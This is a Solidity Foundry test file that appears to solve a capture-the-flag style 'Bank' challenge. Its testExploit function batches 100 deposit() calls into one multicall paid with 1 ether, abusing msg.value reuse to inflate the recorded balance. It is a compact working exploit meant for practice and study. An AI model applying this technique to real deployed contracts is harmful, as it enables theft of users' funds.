// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

import {BankBaseTest} from "./BankBase.t.sol";

contract BankTest is BankBaseTest {
    function testExploit() external validation {
        // TODO
        bytes memory depositCalldata = abi.encodeWithSignature("deposit()");
        bytes[] memory multicallData = new bytes[](100);
        for (uint i = 0; i < 100; i++) {
            multicallData[i] = depositCalldata;
        }
        bank.multicall{value: 1 ether}(multicallData);
    }

    receive() external payable {
    }

    fallback() external payable {
    }
}
